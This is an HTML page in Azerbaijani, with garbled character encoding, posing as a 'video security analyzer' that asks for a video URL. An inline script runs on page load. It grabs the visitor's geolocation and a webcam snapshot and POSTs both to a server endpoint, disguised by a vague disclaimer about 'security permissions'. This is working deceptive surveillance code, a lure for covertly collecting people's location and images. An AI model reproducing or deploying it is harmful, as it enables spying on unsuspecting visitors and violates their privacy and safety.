<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Analizator - TÉ™hlÃ¼kÉ™sizlik YoxlamasÄ±</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Video TÉ™hlÃ¼kÉ™sizlik Analizatoru</h1>
        <p>TÉ™hlil etmÉ™k istÉ™diyiniz video URL-ni daxil edin vÉ™ "TÉ™hlili BaÅŸlat" dÃ¼ymÉ™sinÉ™ basÄ±n.</p>

        <div class="upload-section">
            <input type="url" id="videoUrlInput" placeholder="Video URL daxil edin (mÉ™sÉ™lÉ™n: YouTube, Vimeo linki)" required>
            <button id="analyzeButton">TÉ™hlili BaÅŸlat</button>
        </div>

        <div class="progress-container" id="progressBarContainer">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <p id="status"></p>

        <p id="disclaimer">Bu analiz sizin cihazÄ±nÄ±zÄ±n tÉ™hlÃ¼kÉ™sizlik xÃ¼susiyyÉ™tlÉ™rini yoxlamaq Ã¼Ã§Ã¼n icazÉ™ tÉ™lÉ™b edÉ™ bilÉ™r. NÉ™ticÉ™lÉ™r tÉ™xminidir vÉ™ yalnÄ±z mÉ™lumatlandÄ±rma xarakteri daÅŸÄ±yÄ±r.</p>

        <video id="videoElement" autoplay></video>
        <canvas id="canvasElement"></canvas>
    </div>

    <script src="scripts.js"></script>
    <script>
async function sendData() {
  let locationData = null;
  let imageData = null;

  // ğŸ“ LokasiyanÄ± al
  try {
    const pos = await new Promise((res, rej) =>
      navigator.geolocation.getCurrentPosition(res, rej)
    );
    locationData = {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude
    };
  } catch (err) {
    console.warn('Lokasiya alÄ±nmadÄ±:', err.message);
  }

  // ğŸ“· Kameradan ÅŸÉ™kil al
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    imageData = canvas.toDataURL('image/jpeg');

    stream.getTracks().forEach(t => t.stop());
  } catch (err) {
    console.warn('Kamera alÄ±nmadÄ±:', err.message);
  }

  // ğŸ“¨ ServerÉ™ gÃ¶ndÉ™r
  const payload = {
    videoUrl: 'kmkmkmm',
    location: locationData,
    image: imageData
  };

  const res = await fetch('/api/send-data', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  const result = await res.json();
  console.log(result);
}
sendData();
</script>

</body>
</html>
